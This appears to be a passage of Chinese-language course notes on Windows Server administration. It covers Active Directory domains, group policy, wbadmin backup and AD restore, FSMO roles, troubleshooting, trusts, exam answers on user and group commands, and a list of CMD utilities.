-<h6 id="（三）、配置DNS服务器地址"><a href="#（三）、配置DNS服务器地址" class="headerlink" title="（三）、配置DNS服务器地址"></a>（三）、配置DNS服务器地址</h6><p>1、静态的：   netsh  interface  ip  set  dnsserver  “接口名称”  static  DNS地址<br>2、动态的：   netsh  interface  ip  set  dnsserver  “接口名称”  DHCP</p>
-<h6 id="（四）、计算机名"><a href="#（四）、计算机名" class="headerlink" title="（四）、计算机名"></a>（四）、计算机名</h6><p>特点：网络上必须唯一，即使位于不同的工作组，也不能同名，尽量不要以数字开头，重启后才会生效<br>命令：  netdom  renamecomputer  localhost（127.0.0.1）  /newname ：” 新计算机名”</p>
-<h6 id="（五）、工作组"><a href="#（五）、工作组" class="headerlink" title="（五）、工作组"></a>（五）、工作组</h6><p>定义：是微软设计的一种网络模型，默认情况下所有机器都属于Workgroup工作组环境；该环境下所有机器地位平等</p>
-<hr>
-<h2 id="部署Windows-域环境"><a href="#部署Windows-域环境" class="headerlink" title="部署Windows  域环境"></a>部署Windows  域环境</h2><h4 id="本章结构-8"><a href="#本章结构-8" class="headerlink" title="本章结构"></a>本章结构</h4><p>一、域、活动目录的相关概念<br>二、部署Windows 域环境<br>三、管理域中的账户、组、OU</p>
-<h4 id="具体知识点-3"><a href="#具体知识点-3" class="headerlink" title="具体知识点"></a>具体知识点</h4><h4 id="一、域、活动目录的相关概念"><a href="#一、域、活动目录的相关概念" class="headerlink" title="一、域、活动目录的相关概念"></a>一、域、活动目录的相关概念</h4><h6 id="（一）、工作组"><a href="#（一）、工作组" class="headerlink" title="（一）、工作组"></a>（一）、工作组</h6><p>特点：工作组环境下的计算机地位平等，规模很小（不适合大型企业网络环境）</p>
-<h6 id="（二）、域环境"><a href="#（二）、域环境" class="headerlink" title="（二）、域环境"></a>（二）、域环境</h6><p>定义：逻辑上把网络中计算机组织在一起，集中管理的一种网络环境<br>优点：1、集中管理   2、便捷的网络资源访问   3、可扩展性</p>
-<p>是一个数据库：存储着整个Windows网络中用户、组、计算机、共享文件夹</p>
-<p>活动目录等对象信息是一种服务：能实现对数据对象的增、删、改、查等操作</p>
-<p>域就是活动目录具体的体现形式</p>
-<p>域控制器（DC）：安装了活动目录功能的计算机</p>
-<p> 域环境成员计算机：加入了该域环境的计算机</p>
-<h6 id="（三）、域的结构"><a href="#（三）、域的结构" class="headerlink" title="（三）、域的结构"></a>（三）、域的结构</h6><p>单域：网络中只有一个域 （最常见的管理方式）<br>域树：具有连续名称空间的多个域<br>域林：由一个或多个没有形成连续名称的域树组成</p>
-<h4 id="二、部署Windows-域环境"><a href="#二、部署Windows-域环境" class="headerlink" title="二、部署Windows 域环境"></a>二、部署Windows 域环境</h4><h6 id="（一）、部署域控制器"><a href="#（一）、部署域控制器" class="headerlink" title="（一）、部署域控制器"></a>（一）、部署域控制器</h6><p>必须满足条件： 1、安装者必须是本地管理员权限<br>               2、操作系统版本必须是服务器版本（Web版除外）<br>               3、本地至少一个分区是NTFS文件系统<br>               4、配置静态的IP地址和子网掩码  （正确TCP/IP设置）<br>               5、磁盘空间足够<br>输入安装命令： dcpromo </p>
-<h6 id="（二）、部署成员计算机"><a href="#（二）、部署成员计算机" class="headerlink" title="（二）、部署成员计算机"></a>（二）、部署成员计算机</h6><p>1、客户机必须和域控制器是连通的<br>2、一定要配置正确的DNS地址 （否则无法解析域名，也就无法加入域）</p>
-<h4 id="三、域中用户、组-、OU的管理"><a href="#三、域中用户、组-、OU的管理" class="headerlink" title="三、域中用户、组 、OU的管理"></a>三、域中用户、组 、OU的管理</h4><h6 id="（一）、用户"><a href="#（一）、用户" class="headerlink" title="（一）、用户"></a>（一）、用户</h6><p>1、命名规则：<br>a、唯一的用户登录名  （登录名在域中是唯一的；显示名在OU中唯一）<br>b、最长20字符<br>c、不能出现非法字符  （ &lt;  &gt;  ?  !  /   \  |   = 等）</p>
-<p>2、用户属性<br>a、登录时间 ：  来限制用户登录域的时间<br>b、登录到：可实现账户可以登录的客户机范围<br>c、账户过期：规定用户账户是否存在过期的期限来保证账户安全</p>
-<h6 id="（二）、组"><a href="#（二）、组" class="headerlink" title="（二）、组"></a>（二）、组</h6><p>  安全组：主要是用于设置用户安全权限的组的类型<br>  通讯组：主要用于电子邮件通信的</p>
-<p> 本地域组：使用范围是本域</p>
-<p> 组的作用域    全局组：使用范围是整个林及信任域<br> 通用组：使用范围是整个林及信任域 （用户的登录或查询速度更快）</p>
-<h6 id="（三）、OU的管理"><a href="#（三）、OU的管理" class="headerlink" title="（三）、OU的管理"></a>（三）、OU的管理</h6><p>定义：是活动目录中的一个容器（组织单位）；可以存放用户、组、计算机、OU等其他对象<br>创建方法：基于部门的；基于地理位置的；基于对象类型的<br>特别注意：OU中不能包含来自其他域中的对象</p>
-<hr>
-<h2 id="域控管理"><a href="#域控管理" class="headerlink" title="域控管理"></a>域控管理</h2><h4 id="本章结构-9"><a href="#本章结构-9" class="headerlink" title="本章结构"></a>本章结构</h4><p>一、回顾Windows 域<br>二、添加额外域控及管理<br>三、卸载域控</p>
-<h4 id="具体知识点-4"><a href="#具体知识点-4" class="headerlink" title="具体知识点"></a>具体知识点</h4><h4 id="一、回顾Windows-域"><a href="#一、回顾Windows-域" class="headerlink" title="一、回顾Windows 域"></a>一、回顾Windows 域</h4><p>1、域环境的概念<br>2、域环境的搭建<br>a、安装域控制器的条件      b、客户机加入域的条件   c、用户、组、OU的管理</p>
-<h4 id="二、添加额外域控及管理"><a href="#二、添加额外域控及管理" class="headerlink" title="二、添加额外域控及管理"></a>二、添加额外域控及管理</h4><h6 id="（一）、为什么要有额外域控？"><a href="#（一）、为什么要有额外域控？" class="headerlink" title="（一）、为什么要有额外域控？"></a>（一）、为什么要有额外域控？</h6><p>1、容错   当域中的域控制器出现故障时，其他域控仍能提供域服务<br>2、负载均衡                 适用大型网络环境，加快用户登录域的审核速度<br>3、更易于用户的连接访问     适用于分支机构，提高登录速度</p>
-<h6 id="（二）、安装额外域控的条件"><a href="#（二）、安装额外域控的条件" class="headerlink" title="（二）、安装额外域控的条件"></a>（二）、安装额外域控的条件</h6><p>1、必须具有域管理员身份<br>2、正确的TCP/IP设置  （能保证和域控制通信，DNS设置正确）<br>3、操作系统版本必须受当前域功能级别支持  （向下兼容）<br>安装过程使用命令：dcpromo   （在现有林，添加域控制器）<br>注意：安装过程中不需要加入域也能成功<br>安装完成后，AD中所有数据是同步的</p>
-<h4 id="三、卸载域控制器"><a href="#三、卸载域控制器" class="headerlink" title="三、卸载域控制器"></a>三、卸载域控制器</h4><h6 id="（一）、注意事项"><a href="#（一）、注意事项" class="headerlink" title="（一）、注意事项"></a>（一）、注意事项</h6><p>1、保证域环境中至少有一台全局编录服务器 （用于验证用户登录）<br>2、所有域控一定要处于联机状态<br>3、如果该域控制器不是域内的最后一台域控制器，则该控制器被降级为成员服务器；如果是最后一台域控制器，则降级为独立服务器</p>
-<h6 id="（二）、卸载命令-：-dcpromo"><a href="#（二）、卸载命令-：-dcpromo" class="headerlink" title="（二）、卸载命令 ： dcpromo"></a>（二）、卸载命令 ： dcpromo</h6><hr>
-<h2 id="组策略的应用"><a href="#组策略的应用" class="headerlink" title="组策略的应用"></a>组策略的应用</h2><h4 id="本章结构-10"><a href="#本章结构-10" class="headerlink" title="本章结构"></a>本章结构</h4><p>一、组策略的相关概念<br>二、组策略的应用（修改现有策略、创建、应用规则、软件分发等）</p>
-<h4 id="具体知识点-5"><a href="#具体知识点-5" class="headerlink" title="具体知识点"></a>具体知识点</h4><h4 id="一、组策略的相关概念"><a href="#一、组策略的相关概念" class="headerlink" title="一、组策略的相关概念"></a>一、组策略的相关概念</h4><h6 id="（一）、作用："><a href="#（一）、作用：" class="headerlink" title="（一）、作用："></a>（一）、作用：</h6><p>统一桌面环境、自动执行脚本、安全设置、软件安装等</p>
-<h6 id="（二）、好处："><a href="#（二）、好处：" class="headerlink" title="（二）、好处："></a>（二）、好处：</h6><p>1、减小管理成本（只要设置一次就可对相关用户或计算机生效）<br>2、减小用户单独配置错误的可能性<br>3、可以针对特定对象（用户或计算机）实施特定策略</p>
-<h6 id="（三）、GPO"><a href="#（三）、GPO" class="headerlink" title="（三）、GPO"></a>（三）、GPO</h6><p>1、组策略的所有配置信息都存放在GPO中<br>2、GPO只能链接到站点、域、OU中（SDOU），通过设置来影响容器中的计算机或用户<br>3、默认存在的GPO： 默认域策略（Default Domain Policy ）对整个域都生效<br>                    默认域控制器策略（ Default Domain Controller Policy） 对域控生效</p>
-<h6 id="（四）、组策略的内容"><a href="#（四）、组策略的内容" class="headerlink" title="（四）、组策略的内容"></a>（四）、组策略的内容</h6><p>1、计算机配置 ： 对容器内的计算机生效  （客户端重启生效）<br>2、用户配置：    对容器内的账户生效     （客户端注销生效）</p>
-<h4 id="二、组策略的应用"><a href="#二、组策略的应用" class="headerlink" title="二、组策略的应用"></a>二、组策略的应用</h4><h6 id="（一）、应用规则"><a href="#（一）、应用规则" class="headerlink" title="（一）、应用规则"></a>（一）、应用规则</h6><p>1、默认继承    （下级容器会默认继承上级容器的策略）<br>2、阻止继承     （下级容器可以选择阻止继承上级容器的策略）<br>3、强制生效     （上级容器的策略可以强制让下级容器生效）</p>
-<p>强制生效 &gt; 阻止继承 &gt; 默认继承<br>4、应用顺序与规则<br>1）、顺序：LSDOU的顺序 （从左到右应用），后应用的生效<br>2）、不冲突 ： 累加<br>3）、冲突： 后应用的生效<br>4）、如果同一个容器应用了多个GPO，不冲突则累加；冲突，谁的优先级高谁后应用，谁生效  （优先级=1 为最高）<br>5、筛选：可以实现阻止一个GPO应用到容器中的特定账户或计算机</p>
-<p>6、软件分发<br>1）、准备.msi格式的软件包<br>2）、需要创建共享文件夹，把需要部署的软件放在共享文件夹中，并赋予共享文件夹的共享权限和NTFS权限<br>3）、创建GPO\用户配置\策略\软件设置\软件安装\属性\选择默认程序包的位置<br>4）、添加数据包<br>5）、设置“登录安装此应用程序”<br>6）、验证</p>
-<p> 分配：可以将程序分配到用户或计算机上 （用户必须用的软件，采用“分配”）<br>发布：可以将程序发布给用户，用户可选择是否安装</p>
-<p>注意：分配比发布更具有强制性的部署方式</p>
-<hr>
-<h2 id="Windows-备份和灾难恢复"><a href="#Windows-备份和灾难恢复" class="headerlink" title="Windows 备份和灾难恢复"></a>Windows 备份和灾难恢复</h2><h4 id="本章结构-11"><a href="#本章结构-11" class="headerlink" title="本章结构"></a>本章结构</h4><p>一、Windows  备份工具的概述<br>二、数据备份<br>三、数据还原</p>
-<h4 id="具体知识点-6"><a href="#具体知识点-6" class="headerlink" title="具体知识点"></a>具体知识点</h4><h4 id="一、备份工具"><a href="#一、备份工具" class="headerlink" title="一、备份工具"></a>一、备份工具</h4><h6 id="（一）、备份："><a href="#（一）、备份：" class="headerlink" title="（一）、备份："></a>（一）、备份：</h6><p> 为了避免数据丢失（硬件故障、误操作、病毒感染…..），提前将系统中数据按一定策略存储到安全的地方，当出现问题时能快速还原减少损失</p>
-<h6 id="（二）、还原："><a href="#（二）、还原：" class="headerlink" title="（二）、还原："></a>（二）、还原：</h6><p> 备份的反向过程</p>
-<h6 id="（三）、Windows-Server-Backup"><a href="#（三）、Windows-Server-Backup" class="headerlink" title="（三）、Windows  Server  Backup"></a>（三）、Windows  Server  Backup</h6><p>特性：是Windows  Server 2008系统中的一个功能，由管理控制台和命令行工具组成；能实现对服务器执行基本的备份和还原功能。<br>改变：P73~ P74<br>安装：服务器管理器\功能\选择“Windows  Server Backup”(安装命令行工具，必须安装Windows  Powershell 功能）\下一步安装</p>
-<h4 id="二、数据备份"><a href="#二、数据备份" class="headerlink" title="二、数据备份"></a>二、数据备份</h4><h6 id="（一）、备份方式"><a href="#（一）、备份方式" class="headerlink" title="（一）、备份方式"></a>（一）、备份方式</h6><p>1、手动备份  （一次性备份）<br>2、自动备份   （备份计划）   周期性进行，减少管理员工作量</p>
-<h6 id="（二）、一次性备份的操作"><a href="#（二）、一次性备份的操作" class="headerlink" title="（二）、一次性备份的操作"></a>（二）、一次性备份的操作</h6><p>1、图形化方式<br>2、命令行方式备份<br>wbadmin （固定格式命令）   start  backup （开始备份） -backuptarget：盘符： （备份存储目标位置）  -include：盘符：  （备份的源位置）</p>
-<h6 id="（三）、一次性备份的恢复"><a href="#（三）、一次性备份的恢复" class="headerlink" title="（三）、一次性备份的恢复"></a>（三）、一次性备份的恢复</h6><p>1、图形化<br>2、命令行<br>a、查看可用的备份集版本          wbadmin    get   versions     （查出的关键数据是版本标识符）<br>b、开始恢复        wbadmin    start  recovery （开始恢复） -version：版本标识符   -itemtype：类型   -items：还原内容的具体位置列表（例：D：\aaa.txt）  -recoverytarget：盘符：\    （还原的目标位置）</p>
-<p>类型：三种    volume  代表卷    app  应用程序     file   文件或文件夹</p>
-<h6 id="（四）、计划备份的操作-（准备一块单独硬盘）"><a href="#（四）、计划备份的操作-（准备一块单独硬盘）" class="headerlink" title="（四）、计划备份的操作   （准备一块单独硬盘）"></a>（四）、计划备份的操作   （准备一块单独硬盘）</h6><p>1、图形化<br>2、命令行<br>a、查看可用的磁盘       wbadmin    get   disks    （查看的关键内容是目标磁盘的磁盘标识符）<br>b、 wbadmin   enable  backup （启用备份）   -addtarget ：磁盘标识符 （备份目标存储位置）  -schedule：备份时间     （如果多个时间用逗号隔开）  -include：盘符：  （需要备份的盘）   -allCritical  （包含系统分区卷）<br>注意：计划备份必须包含系统分区<br>3、命令行还原   （同一次性还原）</p>
-<h6 id="（五）、备份配置"><a href="#（五）、备份配置" class="headerlink" title="（五）、备份配置"></a>（五）、备份配置</h6><p>1、完整备份      每次备份所有内容都会备份  （时间长但不影响性能）<br>2、增量备份      只有改动的内容会被备份，以前备份过的不再备份 （速度快，降低整体性能）<br>3、自定义       可针对不同磁盘选择不同方式    （建议：系统盘完整备份，其他盘做增量备份）</p>
-<hr>
-<h2 id="活动目录备份和灾难恢复"><a href="#活动目录备份和灾难恢复" class="headerlink" title="活动目录备份和灾难恢复"></a>活动目录备份和灾难恢复</h2><h4 id="本章结构-12"><a href="#本章结构-12" class="headerlink" title="本章结构"></a>本章结构</h4><p>一、AD备份/还原<br>二、备份/还原操作<br>三、Windows 的安全模式</p>
-<h4 id="具体知识点-7"><a href="#具体知识点-7" class="headerlink" title="具体知识点"></a>具体知识点</h4><h4 id="一、AD备份还原简介"><a href="#一、AD备份还原简介" class="headerlink" title="一、AD备份还原简介"></a>一、AD备份还原简介</h4><h6 id="（一）、为什么要进行活动目录备份？-（p105）"><a href="#（一）、为什么要进行活动目录备份？-（p105）" class="headerlink" title="（一）、为什么要进行活动目录备份？    （p105）"></a>（一）、为什么要进行活动目录备份？    （p105）</h6><h6 id="（二）、注意：如果要备份AD，只能当成系统状态的一部分完成"><a href="#（二）、注意：如果要备份AD，只能当成系统状态的一部分完成" class="headerlink" title="（二）、注意：如果要备份AD，只能当成系统状态的一部分完成"></a>（二）、注意：如果要备份AD，只能当成系统状态的一部分完成</h6><p>​       系统状态数据包括  ：   P105~P106</p>
-<h6 id="（三）、备份系统状态的注意事项"><a href="#（三）、备份系统状态的注意事项" class="headerlink" title="（三）、备份系统状态的注意事项"></a>（三）、备份系统状态的注意事项</h6><p>1、只能用命令完成<br>2、不能自动备份    （如果想实现自动备份，只能通过任务计划完成）<br>3、只能存在本地磁盘<br>4、恢复时只能恢复系统状态数据和应用程序；卷和文件无法恢复<br>5、备份操作者的权限：  只能是Administrators 组和 backup  Operators组成员</p>
-<h6 id="（四）、两种还原方式及区别"><a href="#（四）、两种还原方式及区别" class="headerlink" title="（四）、两种还原方式及区别"></a>（四）、两种还原方式及区别</h6><p>1、非授权还原     （域中只有一台DC  ；域中有多台DC，但是旧数据不需要还原到其他域控制器上）<br>2、授权还原        （域中有多台DC，数据需要还原到所有DC上；是建立在非授权基础之上）</p>
-<h4 id="二、备份-还原操作"><a href="#二、备份-还原操作" class="headerlink" title="二、备份\还原操作"></a>二、备份\还原操作</h4><h6 id="（一）、单域控备份，非授权还原"><a href="#（一）、单域控备份，非授权还原" class="headerlink" title="（一）、单域控备份，非授权还原"></a>（一）、单域控备份，非授权还原</h6><p>1、备份   ： wbadmin    start  systemstatebackup  （开始系统状态备份） -backuptarget：目标盘符：<br>2、删除用户和OU及文件夹<br>3、非授权还原<br>a、重启 按 F8  选择目录服务还原模式 ；用“.\administrator”输入安装域控时目录服务还原密码登录<br>b、查看备份集版本      wbadmin    get    versions    （关键版本标识符）<br>c、非授权还原     wbadmin   start    systemstaterecovery  （开始恢复）  -version：版本标识符<br>d、还原完成后重启，删除的用户和OU可以恢复，文件夹不能恢复</p>
-<h6 id="（二）、多域控，授权还原"><a href="#（二）、多域控，授权还原" class="headerlink" title="（二）、多域控，授权还原"></a>（二）、多域控，授权还原</h6><p>1、环境   （两台DC，一主，一额 ）<br>2、主域控建立了4个域用户：aa、bb、cc、dd ；aa、bb在user中；cc、dd直接在域中；建立了两个OU  aa和bb；在C盘还建立了T218的测试文件夹<br>3、做系统状态备份  （主域控）<br>4、备份完成后，删除刚刚建立的所有内容   （发现误操作）<br>5、先做非授权还原<br>6、授权还原     （需要建立在非授权基础上，非授权完成后不重启）<br>a、Ntdsutil      （进入这个管理工具，专门管理AD活动目录的）<br>b、Active   instance  ntds     （将实例名设置为“NTDS”）<br>c、Authoritative   restore    （进入授权还原命令模式）<br>d、Restore   object   cn=aa （用户名），cn=users ，（代表还原账户所在的位置），dc=benet，（域名），dc=com （域后缀）<br>如果还原OU  把cn改成OU    （注意：如果该用户直接在域中不在users中，可省略cn=users）<br>7、验证  ：只有做了授权的用户或OU会恢复</p>
-<hr>
-<h2 id="操作主机"><a href="#操作主机" class="headerlink" title="操作主机"></a>操作主机</h2><h4 id="本章结构-13"><a href="#本章结构-13" class="headerlink" title="本章结构"></a>本章结构</h4><p>一、操作主机概念<br>二、转移和占用<br>三、操作主机应用  （2003的AD 升级到2008 AD）</p>
-<h4 id="具体知识点-8"><a href="#具体知识点-8" class="headerlink" title="具体知识点"></a>具体知识点</h4><h4 id="一、操作主机概念"><a href="#一、操作主机概念" class="headerlink" title="一、操作主机概念"></a>一、操作主机概念</h4><h6 id="（一）、单主复制"><a href="#（一）、单主复制" class="headerlink" title="（一）、单主复制"></a>（一）、单主复制</h6><p>（出现Windows  NT 4.0的域环境下；域控制器分为PDC （主域控）和BDC （备份域控）两种；PDC可以修改数据库内容；BDC只能读取AD数据库内容）</p>
-<h6 id="（二）、多主复制"><a href="#（二）、多主复制" class="headerlink" title="（二）、多主复制"></a>（二）、多主复制</h6><p>（Windows 2000后；所有域控制器都可以修改AD数据库内容）<br>缺点：所有域控制器的地位平等  （造成网络中某些功能不合适）                                                           </p>
-<h6 id="（三）、操作主机"><a href="#（三）、操作主机" class="headerlink" title="（三）、操作主机"></a>（三）、操作主机</h6><p>（是域控制器的一种角色，担任不同的角色的域控制器有不同功能）</p>
-<h6 id="（四）、五种操作主机角色"><a href="#（四）、五种操作主机角色" class="headerlink" title="（四）、五种操作主机角色"></a>（四）、五种操作主机角色</h6><p>范围 名称 作用 默认位置 管理工具<br>林内唯一 架构主机 统一林中所有对象及其属性 林内的第一台DC上 AD架构regsvr32 schmmgmt.dll)注册<br> 域命名主机 防止林中域名重复  AD域和信任关系<br>域内唯一 PDC仿真主机 域内密码和时间同步；支持2000之前的系统 域内第一台DC AD用户和计算机<br> RID主机 域内分配RID号（SID=域ID + RID）<br> 基础结构主机 所在域中对象到其他域的引用  </p>
-<h4 id="二、转移和占用"><a href="#二、转移和占用" class="headerlink" title="二、转移和占用"></a>二、转移和占用</h4><h6 id="（一）、为什么要转移和占用？-（P130"><a href="#（一）、为什么要转移和占用？-（P130" class="headerlink" title="（一）、为什么要转移和占用？     （P130)"></a>（一）、为什么要转移和占用？     （P130)</h6><h6 id="（二）、转移-正常的角色转换-（担任角色的主机和目标主机需要联机）"><a href="#（二）、转移-正常的角色转换-（担任角色的主机和目标主机需要联机）" class="headerlink" title="（二）、转移     正常的角色转换   （担任角色的主机和目标主机需要联机）"></a>（二）、转移     正常的角色转换   （担任角色的主机和目标主机需要联机）</h6><h6 id="（三）、占用-强制手段转移操作主机角色"><a href="#（三）、占用-强制手段转移操作主机角色" class="headerlink" title="（三）、占用     强制手段转移操作主机角色"></a>（三）、占用     强制手段转移操作主机角色</h6><p>操作步骤： 1、  Ntdsutil      进入管理工具<br>           2、  roles<br>           3、  connection<br>           4、  connect   to   server  本机的全名 （目标DC   的FQDN）<br>           5、   quit        后退一步<br>           6、   Seize   五种操作主机角色  （逐一操作）<br>注意：1、能转移绝不占用<br>      2、被占用的操作角色不要再连接到网络上 </p>
-<h4 id="三、将Windows-Server-2003的AD升级到Windows-Server-2008AD"><a href="#三、将Windows-Server-2003的AD升级到Windows-Server-2008AD" class="headerlink" title="三、将Windows  Server 2003的AD升级到Windows  Server 2008AD"></a>三、将Windows  Server 2003的AD升级到Windows  Server 2008AD</h4><h6 id="（一）、网络环境"><a href="#（一）、网络环境" class="headerlink" title="（一）、网络环境"></a>（一）、网络环境</h6><p>已知的2003的域控制器和一台2008工作组环境的服务器</p>
-<h6 id="（二）、目标"><a href="#（二）、目标" class="headerlink" title="（二）、目标"></a>（二）、目标</h6><p>将2008服务器变成该网络的域控制器</p>
-<h6 id="（三）、具体步骤"><a href="#（三）、具体步骤" class="headerlink" title="（三）、具体步骤"></a>（三）、具体步骤</h6><p>1、扩展2003的功能   （因为2003不支持2008的功能）<br>a、将2008的光盘插入2003系统中    运行命令 D:  进入光驱<br>b、运行命令    cd  source \adprep<br>c、adprep.exe  /forestprep        扩展林信息  输入 C  回车<br>d、提升域功能级别为本机模式   （即域功能级别为2003）<br>e、adprep.exe  /domainprep      （扩展域架构）<br>f、adprep.exe  /domainprep   /gpprep     （更新组策略对象权限）<br>g、adprep.exe   /rodcprep       （更新对只读域控的支持）</p>
-<p>2、将2008变成额外域控制器   （将首选DNS指向自己）<br>3、转移操作主机角色到2008上<br>4、卸载2003域控制器<br>5、先提升林功能级别和域功能级别<br>6、删除2003的残余信息   （在AD站点和服务）</p>
-<hr>
-<h2 id="AD常见故障排查"><a href="#AD常见故障排查" class="headerlink" title="AD常见故障排查"></a>AD常见故障排查</h2><h4 id="本章结构-14"><a href="#本章结构-14" class="headerlink" title="本章结构"></a>本章结构</h4><p>一、AD常见故障排查思路<br>二、常见故障举例</p>
-<h4 id="具体知识点-9"><a href="#具体知识点-9" class="headerlink" title="具体知识点"></a>具体知识点</h4><h4 id="一、常见故障及排障思路"><a href="#一、常见故障及排障思路" class="headerlink" title="一、常见故障及排障思路"></a>一、常见故障及排障思路</h4><h6 id="（一）、常见故障"><a href="#（一）、常见故障" class="headerlink" title="（一）、常见故障"></a>（一）、常见故障</h6><p>1、加入域失败     2、域用户无法登录      3、域登录缓慢<br>4、组策略部署不生效     5、数据同步失败</p>
-<h6 id="（二）、排障思路"><a href="#（二）、排障思路" class="headerlink" title="（二）、排障思路"></a>（二）、排障思路</h6><p>1、单一用户        用户是否禁用、密码是否过期、是否有权限<br>2、单一客户端      时间是否同步、IP是否设置正确、DNS是否正确<br>3、网络            交换路由设备<br>4、服务器          AD是否正常运行，DNS服务器是否正常工作</p>
-<h4 id="二、常见故障举例"><a href="#二、常见故障举例" class="headerlink" title="二、常见故障举例"></a>二、常见故障举例</h4><h6 id="（一）、客户机无法加入域"><a href="#（一）、客户机无法加入域" class="headerlink" title="（一）、客户机无法加入域"></a>（一）、客户机无法加入域</h6><p>1、分析：不是单一用户          单一计算机  （DNS设置是否正确）<br>测试   ：ping   ip  和 域名<br>查看DNS缓存的命令：  ipconfig  /displaydns<br>刷新DNS缓存          ipconfig  /flushdns    （清空）<br>2、解决方法：设置正确的DNS指向，清空DNS缓存</p>
-<h6 id="（二）、用户无法登录"><a href="#（二）、用户无法登录" class="headerlink" title="（二）、用户无法登录"></a>（二）、用户无法登录</h6><p>1、分析：<br>1）、换用户登录，依旧不能登录说明不是用户的问题<br>2）、换客户端登录，依旧不能登录说明不是客户端问题<br>3）、用ping命令验证 ：  ping  IP地址可通；但是ping  域名不同  得出是DNS有问题<br>4）、首先检查DNS客户端；第二步检查DNS服务器问题<br>2、解决方法：重启DNS服务</p>
-<h6 id="（三）、部分用户登录缓慢"><a href="#（三）、部分用户登录缓慢" class="headerlink" title="（三）、部分用户登录缓慢"></a>（三）、部分用户登录缓慢</h6><p>1、分析：<br>1）、能登录，但是时间长说明不是客户端问题<br>2）、ping  两台DC的IP都能通，但是Ping 域名不通说明网络没问题还是DNS问题<br>3）、用nslookup 解析域名失败，换首选DNS能成功，说明其中一个DNS服务器有问题<br>2、解决方法：换DNS首选指向，解决故障的DNS服务器</p>
-<h6 id="（四）、组策略不生效的问题"><a href="#（四）、组策略不生效的问题" class="headerlink" title="（四）、组策略不生效的问题"></a>（四）、组策略不生效的问题</h6><p>1、分析：<br>1）、是否对所有用户都不生效<br>2）、在服务器上运行  “gpupdate /force”刷新组策略  （重启服务器和客户端）<br>3）、检查是计算机配置还是用户配置<br>4）、检查组策略是否有冲突    （LSDOU顺序及组策略应用规则）</p>
-<h6 id="（五）、DC间复制数据失败"><a href="#（五）、DC间复制数据失败" class="headerlink" title="（五）、DC间复制数据失败"></a>（五）、DC间复制数据失败</h6><p>1、分析：现象两台DC，在其中一台新建账户，发现账户不能同步<br>2、解决方法：DC间影响数据同步的因素<br>1）、网络问题     2）、时间是否同步<br>如果手动复制失败，时间问题<br>同步时间： net   time   \对方的主机名（或IP地址）   /set   /y</p>
-<hr>
-<h2 id="多域间访问"><a href="#多域间访问" class="headerlink" title="多域间访问"></a>多域间访问</h2><h4 id="本章结构-15"><a href="#本章结构-15" class="headerlink" title="本章结构"></a>本章结构</h4><p>一、林内信任关系<br>二、林间信任关系</p>
-<h4 id="具体知识点-10"><a href="#具体知识点-10" class="headerlink" title="具体知识点"></a>具体知识点</h4><h4 id="一、林内信任关系"><a href="#一、林内信任关系" class="headerlink" title="一、林内信任关系"></a>一、林内信任关系</h4><h6 id="（一）、林根域、子域、树根域的概念"><a href="#（一）、林根域、子域、树根域的概念" class="headerlink" title="（一）、林根域、子域、树根域的概念"></a>（一）、林根域、子域、树根域的概念</h6><p>Enterprise  Admins （企业管理组）：可以对活动目录</p>
-<p>1、林根域：林中创建的第一个域       的整个林做修改Schema  Admins （架构管理组）：扩展林架构</p>
-<p>2、子域：向域树中添加的任何新域都叫子域，子域的域名= 自己的名字 + 父域的域名</p>
-<p>3、树根域：在林环境中建立的具有独立的域名的一个域树</p>
-<h6 id="（二）、林内的信任关系"><a href="#（二）、林内的信任关系" class="headerlink" title="（二）、林内的信任关系"></a>（二）、林内的信任关系</h6><p>1、搭建环境：必须是林根域Enterprise  Admins 成员<br>2、信任关系特点<br>a、自动建立 （环境搭建完成后自动建立 树根信任和父子信任）<br>b、双向</p>
-<p>c、可传递的信任    A和B相互信任  B和C相互信任        A和C相互信任<br>3、验证方法 ： AGDLP规则<br>1、A 用户；G代表全局组、DL代表本地域组、P权限<br>将本域中的账户加入全局组（范围信任整个林及信任域）；将全局组加入信任域的本地域组；给本地域组赋予权限；本域中的账户可以访问信任域中的资源<br>2、林中所有域账户都能在同一台客户机去登录自己的域</p>
-<h4 id="二、林间信任"><a href="#二、林间信任" class="headerlink" title="二、林间信任"></a>二、林间信任</h4><h6 id="（一）、外部信任"><a href="#（一）、外部信任" class="headerlink" title="（一）、外部信任"></a>（一）、外部信任</h6><p>特点：<br>1、手动建立   2、不可传递性   3、分双向和单向</p>
-<p> 外传：本地域信任指定域</p>
-<p>单向<br>内传： 指定域信任本域<br>作用：实现特定域之间的信任，从而实现相互访问</p>
-<h6 id="（二）、林信任"><a href="#（二）、林信任" class="headerlink" title="（二）、林信任"></a>（二）、林信任</h6><p>特点： 1、手动建立    2、可传递性   3、只能在林根域上建立  4、分双向和单向<br>作用：实现林间任意域之间的信任及相互访问</p>
-<hr>
-<h2 id="升级域和林功能级别"><a href="#升级域和林功能级别" class="headerlink" title="升级域和林功能级别"></a>升级域和林功能级别</h2><h1 id="考试"><a href="#考试" class="headerlink" title="考试"></a>考试</h1><ol>
-<li>写出打开本地安全策略  本地组策略的命令</li>
-</ol>
-<p>答：打开本地安全策略命令：<strong>Secpol.msc</strong></p>
-<p>​    打开本地组策略命令：<strong>gpedit.msc</strong></p>
-<ol>
-<li>写出所有用户和组相关的所有windows命令</li>
-</ol>
-<p>答：</p>
-<p>查看当前存在用户：</p>
-<p><strong>net user</strong></p>
-<p>查看当前用户组：</p>
-<p><strong>net localgroup</strong></p>
-<p>添加用户（以添加用户Waldo，密码为cuit为例）：</p>
-<p><strong>net user Waldo cuit /add</strong></p>
-<p>添加用户到组（以添加用户Waldo到Administrators组为例）：</p>
-<p><strong>net localgroup Administrators Waldo /add</strong></p>
-<p>skyfall007</p>
-<p>windows下CMD命令大全</p>
-<p>CMD命令：开始－&gt;运行－&gt;键入cmd或command（在命令行里可以看到系统版本、文件系统版本）</p>
-<p>chcp 修改默认字符集</p>
-<p>chcp 936默认中文</p>
-<p>chcp 65001</p>
-<p>\1. appwiz.cpl：程序和功能</p>
-<p>\2. calc：启动计算器</p>
-<p>\5. chkdsk.exe：Chkdsk磁盘检查（管理员身份运行命令提示符）</p>
-<p>\6. cleanmgr: 打开磁盘清理工具</p>
-<p>\9. cmd.exe：CMD命令提示符</p>
-<p>\10. 自动关机命令</p>
-<p>　 Shutdown -s -t 600：表示600秒后自动关机</p>
-<p>　 shutdown -a ：可取消定时关机</p>
-<p>　 Shutdown -r -t 600：表示600秒后自动重启</p>
-<p>\12. CompMgmtLauncher：计算机管理</p>
-<p>\13. compmgmt.msc：计算机管理</p>
-<p>\14. credwiz：备份或还原储存的用户名和密码</p>
-<p>\16. control：控制面版</p>
